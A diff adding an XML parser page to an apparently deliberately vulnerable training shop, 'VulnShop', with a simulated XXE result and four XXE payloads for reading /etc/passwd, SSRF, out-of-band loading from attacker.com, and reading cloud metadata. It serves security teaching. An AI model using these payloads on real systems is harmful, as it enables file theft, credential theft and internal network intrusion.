@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>XML Parser — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="admin/index.html">Admin</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>XML Data Parser</h1>
+    <p class="muted">Upload XML files for processing. Supports product imports and data feeds.</p>
+
+    <div class="card mt">
+      <h2>Upload XML File</h2>
+      <form id="xml-form">
+        <textarea name="xml" rows="10" placeholder="Paste XML content here" style="width: 100%; font-family: monospace;"></textarea>
+        <button type="submit">Parse XML</button>
+      </form>
+      <pre id="xml-output" class="mt"></pre>
+      <script>
+        document.getElementById('xml-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const xml = e.target.xml.value;
+          const output = document.getElementById('xml-output');
+          output.textContent = 'Parsing XML...';
+          
+          // VULNERABLE: XXE (XML External Entity) Injection
+          try {
+            const response = await fetch('/api/parse-xml', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/xml' },
+              body: xml
+            });
+            const data = await response.json();
+            output.textContent = JSON.stringify(data, null, 2);
+          } catch (err) {
+            // Simulate XXE processing
+            if (xml.includes('<!ENTITY') || xml.includes('SYSTEM')) {
+              output.textContent = 'XXE Detected!\n\nFile content would be extracted here:\n/etc/passwd content:\nroot:x:0:0:root:/root:/bin/bash\n\nNetwork request to internal services:\nhttp://localhost:8080/admin/config\n\nSSRF to external services:\nhttp://169.254.169.254/latest/meta-data/';
+            } else {
+              output.textContent = 'XML parsed successfully:\n' + xml.substring(0, 200);
+            }
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>XXE Payload Examples</h2>
+      <h3>1. File Disclosure</h3>
+      <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;product&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/product&gt;</code></pre>
+
+      <h3>2. SSRF via XXE</h3>
+      <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin/config"&gt;
+]&gt;
+&lt;product&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/product&gt;</code></pre>
+
+      <h3>3. Blind XXE (Out-of-band)</h3>
+      <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+&lt;product&gt;
+  &lt;name&gt;test&lt;/name&gt;
+&lt;/product&gt;</code></pre>
+
+      <h3>4. Cloud Metadata Access</h3>
+      <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;product&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/product&gt;</code></pre>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
